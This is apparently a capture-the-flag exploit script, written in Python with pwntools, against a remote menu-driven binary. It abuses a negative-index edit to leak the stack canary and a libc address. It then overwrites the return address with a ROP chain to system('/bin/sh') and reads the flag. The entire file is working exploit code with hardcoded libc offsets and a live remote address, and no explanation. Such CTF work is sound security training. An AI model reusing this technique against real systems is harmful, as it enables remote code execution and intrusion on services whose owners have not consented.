from pwn import *
context(os='linux', arch='amd64',log_level='debug')
p=remote("111.186.57.85",40311)
passwd="CTF_is_interesting_isn0t_it?"
libc_start_main_ret=0x29d90
libc_start_main=0x29dc0
system=0x50d70
bin_sh=0x1d8678
pop_rdi_ret=0x2a3e5
pop_rsi_ret=0x2be51
stack_chk_fail=0x136550
puts=0x80e50
ret=0x2a3e6

p.sendline(passwd)

def add(payload):
    p.sendlineafter("Your choice:","1")
    p.sendline(payload)

def show():
    p.sendlineafter("Your choice:","2")
    p.recvuntil("Content:\n",drop=True)
    

def edit(num,payload):
    p.sendlineafter("Your choice:","3")
    p.sendlineafter("change:",str(num))
    p.sendline(payload)
def clear():
    p.sendlineafter("Your choice:","4")

edit(265-(1<<32),'a'*265)
show()
p.recvuntil('a'*265,drop=True)
canary=u64(b'\x00'+p.recv(7))
print("Canary=",hex(canary))
edit(280-(1<<32),b'a'*280)
show()
p.recvuntil(b'a'*280,drop=True)
libc=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))-libc_start_main_ret
print("libc=",hex(libc))
edit(312-(1<<32),b'a'*264+p64(canary)+b'b'*8+p64(ret+libc)+p64(pop_rdi_ret+libc)+p64(bin_sh+libc)+p64(system+libc))

p.sendline("5")
p.sendlineafter("Error Choice!\n","cat flag")
print(p.recvall())
